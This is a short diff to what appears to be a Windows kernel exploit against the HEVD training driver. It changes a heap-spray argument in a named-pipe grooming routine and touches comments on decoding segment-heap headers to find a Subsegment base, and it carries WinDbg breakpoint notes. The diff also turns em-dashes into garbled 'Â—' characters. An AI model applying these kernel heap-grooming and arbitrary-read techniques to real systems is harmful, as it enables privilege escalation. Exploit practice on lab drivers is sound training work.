@@ -942,8 +942,8 @@ uintptr_t findSelfEprocess(PIPE_HANDLES* ghost_pipe, uintptr_t system_eprocess)
  * XOR-encoding scheme (Header ^ Address ^ RtlpHpHeapGlobals).
  *
  * Once a valid allocated chunk is found, it uses the 'EncodedSegmentPageOffset'
- * field—which contains the distance (in pages) from the Subsegment base to the
- * current page—to calculate the Subsegment's starting address.
+ * fieldÂ—which contains the distance (in pages) from the Subsegment base to the
+ * current pageÂ—to calculate the Subsegment's starting address.
  *
  * @param ghost_pipe Pointer to the pipe handles providing the arbitrary read primitive.
  * @return The kernel virtual address of the VS Subsegment base.
@@ -1327,7 +1327,7 @@ BOOL TriggerHEVDVulnerability() {
     char payload[HACK_CHUNK_SIZE];
     memset(payload, 0x90, HACK_CHUNK_SIZE);
 
-    if (PipeQueueEntrySpray(payload, SPRAY_HACK, NUM_ENABLE_SUBSEGMENT, SPRAY_HACK, 0))
+    if (PipeQueueEntrySpray(payload, SPRAY_HACK, NUM_ENABLE_SUBSEGMENT, NUM_ENABLE_SUBSEGMENT, 0))
     {
         printf("\n[***] The heap has been sprayed to groom the heap\n");
             // In a real exploit, the next step would be the DeviceIoControl call 
@@ -1700,5 +1700,6 @@ int main() {
 bp HEVD+0x862ea -> before memmove
 bp HEVD+0x862EF  -> after memmove
 bp HEVD+0x8635F    -> After free (overlapping chunk)
+
 
 */
